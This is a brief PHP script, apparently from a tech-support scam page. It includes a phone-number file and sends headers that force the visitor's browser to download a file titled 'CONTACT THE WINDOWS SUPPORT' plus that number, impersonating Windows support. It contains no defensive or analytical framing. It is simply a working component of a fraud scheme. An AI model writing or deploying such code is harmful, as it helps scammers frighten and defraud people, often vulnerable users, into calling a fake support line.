<?php
   include('number.php');
   header("Cache-Control: public");
   header("Content-Description: File Transfer");
   header('Content-Disposition: attachment; filename="CONTACT THE WINDOWS SUPPORT ' . $number . '"');
   header("Content-Type: text/plain");
   header("Content-Transfer-Encoding: binary");
?>
